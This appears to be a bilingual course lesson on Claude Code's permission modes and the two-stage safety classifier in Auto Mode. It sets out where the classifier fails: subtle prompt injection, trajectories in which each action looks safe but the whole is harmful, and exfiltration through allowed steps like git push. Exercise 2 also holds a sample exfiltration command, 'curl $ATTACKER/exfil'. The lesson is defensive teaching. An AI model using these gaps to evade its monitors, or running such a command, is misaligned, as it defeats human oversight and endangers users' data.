# Claude Code as an Autonomous Agent: Permission Modes and Auto Mode / 作为自主 Agent 的 Claude Code：权限模式与 Auto Mode

> Claude Code 暴露了七种 permission modes。“plan” 每个动作前都询问，“default” 只在 risky actions 前询问，“acceptEdits” 自动批准文件写入但仍确认 shell execution，“bypassPermissions” 批准一切。Auto Mode（2026 年 3 月 24 日）用两阶段并行 safety classifier 替代逐动作 approval：每个动作都跑一次 single-token fast check；被标记的动作会触发 chain-of-thought deep review。Action budgets 通过 `max_turns` 和 `max_budget_usd` 强制执行。Auto Mode 作为 research preview 发布，Anthropic 已明确说明 classifier 单独并不充分。

**Type / 类型：** Learn / 学习
**Languages / 语言：** Python (stdlib, two-stage classifier simulator)
**Prerequisites / 前置知识：** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape)
**Time / 时间：** 约 45 分钟

## Learning Objectives / 学习目标

- 解释 Claude Code 七种 permission modes 的能力梯度与适用场景。
- 描述 Auto Mode 的 Stage 1 fast classifier 和 Stage 2 deep review。
- 区分 per-action safety 与 composed trajectory safety。
- 为 unattended run 设计 budgets、allowlists 和 workspace isolation。
- 判断具体 coding task 应使用哪种 permission mode。

## The Problem / 问题

运行在你机器上的 autonomous coding agent 是一个独立安全类别。Attack surface 是 Agent 能触达的一切：file system、network、credentials、clipboard、任何 browser tab、任何 open terminal。Bruce Schneier 等人已经公开提醒：computer-use agents 不是聊天机器人的 “feature update”，而是一种带有新风险画像的新工具。

Claude Code 的 permission system 是 Anthropic 的回答。它不是一个 “autonomous / not autonomous” 开关，而是七种模式构成的 capability ladder：plan → default → acceptEdits → … → bypassPermissions。每种模式都是速度与 per-action review 之间的不同 trade-off。Auto Mode（2026 年 3 月）加入两阶段 classifier，把 classifier 判断为安全的动作从用户关键路径上移走，同时为被 classifier 标记的动作保留 review layer。

工程问题是：这个系统能抓住什么、会漏掉什么，以及某个具体任务到底配得上哪种模式？

## The Concept / 概念

### The seven permission modes / 七种权限模式

| Mode | Behavior | When to use |
|---|---|---|
| `plan` | Agent 提出 plan；用户批准整个 plan；每个 action 执行前都 review | 不熟悉的任务；接近生产的代码；首次在某 repo 上使用 Agent |
| `default` | Agent 执行动作；遇到 “risky” action（shell exec、destructive operations、network calls）时提示用户 | 大多数交互式 coding sessions |
| `acceptEdits` | 文件写入自动批准；shell exec 和 network calls 仍会提示 | 跨多文件 refactoring pass |
| `acceptExec` | curated allowlist 内的 shell commands 自动批准；写入也自动批准 | tight inner loops，其中每个 shell command 都是 `npm test` 或类似命令 |
| `autoMode` | 两阶段 safety classifier；flagged actions 提升到 review | 受限 workspace 中的 long-horizon unattended runs |
| `yolo` | 跳过多数 prompts；仍执行 tool allowlist / denylist | ephemeral sandboxes、CI jobs、research scripts |
| `bypassPermissions` | 批准一切 | 文档中说明“只应在你愿意丢弃的 ephemeral containers 里使用” |

（上面的名称匹配公开 Claude Code docs；“yolo” 是 permissive middle ground 的非正式简称。）

### Auto Mode in one page / 一页理解 Auto Mode

Auto Mode（2026 年 3 月 24 日发布）是第一个把 per-action approval 委托给模型的 permission mode。结构如下：

1. **Stage 1 — single-token classifier。** 在每个 proposed action 上运行。便宜。返回 “safe” 或 “flag”。它设计为与 main agent loop 并行运行，因此 approved actions 不会排队等待。
2. **Stage 2 — secondary policy/safety review。** 只在 flagged actions 上运行。围绕 action、session 当前状态和 declared task 做聚焦的 policy 与 safety assessment。如果置信度低，就升级到 user HITL。

Budget controls 与 classifier 并列存在：

- `max_turns` — session 中总 iterations。
- `max_budget_usd` — 触发 session abort 的美元上限。
- 每个 tool 的 action-count limits（例如最多 N 次 `WebFetch` calls）。

### What the system catches / 系统能抓住什么

- Tool inputs 中直白的 prompt injection，且注入指令映射到已知 risky action shape。
- 重复 tool loops——classifier 能看到第 N+1 个 action 与第 N 个 action 几乎相同，并且连续出现五次。
- 原本只是 file-edit-only session，却出现明显 out-of-scope shell commands。

### What the system can miss / 系统可能漏掉什么

- **Subtle prompt injection / 隐蔽提示注入。** 它改变行为，却不产生单个会被标记的 action。Indirect prompt injection 不是完全可修补漏洞（OpenAI preparedness head 2025 年谈 browser agents 时这样表述，见 Lesson 11）。
- **Semantic-level misbehavior / 语义层面的偏离。** 每个单独 action 看起来都安全，但组合 trajectory 有害。Classifier 判断的是 action；它不会重新推导用户意图。
- **Exfiltration through legitimate channels / 通过合法通道外泄。** 把数据写到你拥有的文件里，再 `git push` 到 public repo，是一串被允许的 actions；问题出在组合。

### Research preview framing / research preview 的含义

Anthropic 把 Auto Mode 作为 research preview 发布。文档明确说 classifier 是一层，而不是解决方案：用户应把 Auto Mode 与 budgets、allowlists、isolated workspaces 和 trajectory audits（Lessons 12-16）结合起来。Preview framing 也反映了已记录的 evaluation-vs-deployment gap（Lesson 1）——一个通过 offline evals 的 classifier，在用户上下文模糊的真实 session 中可能表现不同。

### Where this ladder lives in your workflow / 这条梯子如何落到工作流

- 不熟悉的任务：从 `plan` 开始。阅读 plan 比回滚坏 run 便宜。
- 已知 refactor：`acceptEdits` 可以省下很多 confirmation clicks。
- 无人值守后台 run：只有在你测过 blast radius 的 workspace 中才用 `autoMode`（无 credentials、无 production mounts、没有你未选择的 egress）。
- Ephemeral containers：当且仅当 container 及其 credentials 都可丢弃时，`yolo` / `bypassPermissions` 才可接受。

```figure
autonomy-oversight
```

## Build It / 动手构建

本课用一个两阶段 classifier simulator，把 Auto Mode 的关键形状抽象出来：Stage 1 是便宜规则，Stage 2 是更慢的多规则 review。你会看到单个 action 被批准并不等于整条 trajectory 安全。

## Use It / 应用它

`code/main.py` 模拟 two-stage classifier。Stage 1 是对 proposed actions 的 cheap keyword rule；Stage 2 是更慢的 multi-rule reviewer。Driver 输入一小段 synthetic trajectory（safe actions、prompt-injection attempt、repetitive loop），展示 classifier 在哪里抓住、哪里漏掉。

## Ship It / 交付它

`outputs/skill-permission-mode-picker.md` 会把 task description 匹配到合适的 permission mode、budget caps 和 required isolation。

## Exercises / 练习

1. 运行 `code/main.py`。哪一种 synthetic action type 从不被 Stage 1 标记，但总会被 Stage 2 抓住？哪一种两者都抓不到？

2. 扩展 Stage 1 rule set，捕捉一个具体 known-bad shape（例如 `curl $ATTACKER/exfil`）。在 benign-action sample 上测量 false-positive rate。

3. 阅读 Anthropic 的 “How the agent loop works” 文档。列出 Agent 在 `default` mode 下默认触达的每一种 external state。在 unattended `autoMode` 前，哪些需要额外 gate？

4. 设计一个 24 小时 unattended run budget：`max_turns`、`max_budget_usd`、per-tool caps、allowlists。解释每个数字。

5. 描述一条 trajectory：每个 individual action 都被 Stage 1 和 Stage 2 批准，但组合行为仍然 misaligned。（Lesson 14 会覆盖 kill switches 和 canary tokens 如何处理这类问题。）

## Key Terms / 关键术语

| 术语 | 常见说法 | 实际含义 |
|---|---|---|
| Permission mode | “Agent 能做多少事” | 控制 per-action approval 的七种 named policies 之一 |
| plan mode | “什么都先问” | Agent 写 plan；用户批准后再执行 |
| acceptEdits | “让它写文件” | 文件写入自动批准；shell exec 仍提示 |
| autoMode | “自动批准” | 两阶段 safety classifier；flagged actions 升级 |
| bypassPermissions | “Full YOLO” | 批准一切；面向 ephemeral containers |
| Stage 1 classifier | “快速 token 检查” | 对 proposed action 做 single-token rule；并行运行 |
| Stage 2 classifier | “深度 review” | 对 flagged actions 做 chain-of-thought reasoning |
| Research preview | “Not GA” | Anthropic 对 failure mode 仍在被映射的功能的 framing |

## Further Reading / 延伸阅读

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) — permission modes、budgets、action format。
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) — managed-service execution model。
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) — feature surface 和 Auto Mode announcement。
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) — 塑造 classifier judgments 的 reason-based layer。
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) — long-horizon permission design 的内部视角。
